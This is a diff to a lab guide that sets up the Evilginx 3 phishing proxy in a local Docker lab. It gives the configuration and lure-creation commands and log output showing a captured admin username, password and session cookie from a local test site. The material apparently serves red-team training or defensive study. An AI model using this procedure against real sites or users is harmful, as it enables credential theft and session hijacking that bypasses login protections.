@@ -43,49 +43,97 @@ Verify if they run:
 
 
 ## Start evilnginx
-	
-	sudo docker exec -it evilginx3.local /bin/bash 
-	root@d82bae9ce059:/evilginx2# ./evilginx2 
+```bash 
+sudo docker exec -it evilginx3.local /bin/bash 
+root@bd1cc49349a5:/evilginx2# ./evilginx2 -developer
 
                                          
-                                             ___________      __ __           __               
-                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
-                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
-                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    < 
-                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
-                                                     \/              /_____/         \/      \/
+___________      __ __           __               
+\_   _____/__  _|__|  |    ____ |__| ____ ___  ___
+|    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
+|        \\   /|  |  |__/ /_/  >  |   |  \>    < 
+/_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
+     \/              /_____/         \/      \/
+
+        - --  Community Edition  -- -
+
+by Kuba Gretzky (@mrgretzky)     version 3.3.0
                                          
-                                                        - --  Community Edition  -- -
-                                         
-                                               by Kuba Gretzky (@mrgretzky)     version 3.3.0
-                                         
 
-	[11:20:42] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)
-	[11:20:42] [inf] loading phishlets from: /evilginx2/phishlets
-	[11:20:42] [inf] loading configuration from: /root/.evilginx
-	[11:20:42] [inf] blacklist mode set to: unauth
-	[11:20:42] [inf] unauthorized request redirection URL set to: https://www.youtube.com/watch?v=dQw4w9WgXcQ
-	[11:20:42] [inf] https port set to: 443
-	[11:20:42] [inf] dns port set to: 53
-	[11:20:42] [inf] autocert is now enabled
-	[11:20:42] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
-	[11:20:42] [war] server domain not set! type: config domain <domain>
-	[11:20:42] [war] server external ip not set! type: config ipv4 external <external_ipv4_address>
-	[11:20:42] [inf] obtaining and setting up 0 TLS certificates - please wait up to 60 seconds...
-	[11:20:42] [inf] successfully set up all TLS certificates
+[16:02:29] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)
+[16:02:29] [inf] loading phishlets from: /evilginx2/phishlets
+[16:02:29] [inf] loading configuration from: /root/.evilginx
+[16:02:29] [inf] blacklist mode set to: unauth
+[16:02:29] [inf] unauthorized request redirection URL set to: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+[16:02:29] [inf] https port set to: 443
+[16:02:29] [inf] dns port set to: 53
+[16:02:29] [inf] autocert is now enabled
+[16:02:29] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
+[16:02:30] [war] server domain not set! type: config domain <domain>
+[16:02:30] [war] server external ip not set! type: config ipv4 external <external_ipv4_address>
 
-	+-----------+-----------+-------------+-----------+-------------+
-	| phishlet  |  status   | visibility  | hostname  | unauth_url  |
-	+-----------+-----------+-------------+-----------+-------------+
-	| example   | disabled  | visible     |           |             |
-	+-----------+-----------+-------------+-----------+-------------+
++-------------------+-----------+-------------+-----------+-------------+
+|     phishlet      |  status   | visibility  | hostname  | unauth_url  |                                                                                                                                                                  
++-------------------+-----------+-------------+-----------+-------------+                                                                                                                                                                  
+| example           | disabled  | visible     |           |             |                                                                                                                                                                  
+| targetsite-local  | disabled  | visible     |           |             |                                                                                                                                                                  
++-------------------+-----------+-------------+-----------+-------------+                                                                                                                                                                  
 
-	:  
+:  
 
+
+```
+                                        
 ## Config Evilngnix container
 
-### Add a subdomain alias
+	: config domain evilginx3.local
+	: config ipv4 172.18.0.10
+	: phishlets hostname targetsite-local evilginx3.local
+	: phishlets get-hosts targetsite-local 
 
-sudo docker exec -it evilginx3.local /bin/bash                                                     
-root@f5c76fc94de6:/evilginx2# echo "127.0.0.1    example.local" >> /etc/hosts
-	
+		172.18.0.10 login.evilginx3.local
+		172.18.0.10 evilginx3.local
+	: phishlets enable  targetsite-local 
+	: lures create targetsite-local 
+	: lures
+	: lures get-url 0
+		
+		https://login.evilginx3.local/eiyTwTXQ
+
+## Captured the session token
+
+: 2024/12/04 16:14:15 [001] WARN: Cannot handshake client login.targetsite.local remote error: tls: unknown certificate authority
+[16:14:23] [imp] [0] [targetsite-local] new visitor has arrived: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 (10.0.2.15)
+[16:14:23] [inf] [0] [targetsite-local] landing URL: https://login.evilginx3.local/eiyTwTXQ
+[16:15:04] [+++] [0] Username: [adasdas]
+[16:15:04] [+++] [0] Password: [dsdsdsd]
+[16:15:45] [+++] [0] Username: [admin]
+[16:15:45] [+++] [0] Password: [Pwd Sicur@ 123]
+[16:15:45] [+++] [0] detected authorization URL - tokens intercepted: /admin.php
+: sessions 
+
++-----+-------------------+-----------+-----------------+-----------+------------+-------------------+
+| id  |     phishlet      | username  |    password     |  tokens   | remote ip  |       time        |                                                                                                                                      
++-----+-------------------+-----------+-----------------+-----------+------------+-------------------+                                                                                                                                      
+| 1   | targetsite-local  | admin     | Pwd Sicur@ 123  | captured  | 10.0.2.15  | 2024-12-04 16:15  |                                                                                                                                      
++-----+-------------------+-----------+-----------------+-----------+------------+-------------------+          
+
+: sessions 1
+
+ id           : 1
+ phishlet     : targetsite-local
+ username     : admin
+ password     : Pwd Sicur@ 123
+ tokens       : captured
+ landing url  : https://login.evilginx3.local/eiyTwTXQ
+ user-agent   : Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+ remote ip    : 10.0.2.15
+ create time  : 2024-12-04 16:14
+ update time  : 2024-12-04 16:15
+
+[ cookies ]
+[{"path":"/","domain":"login.targetsite.local","expirationDate":1764865104,"value":"sibi2d083ecfn4shbco7i1ro5d--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]
+
+:  
+
+
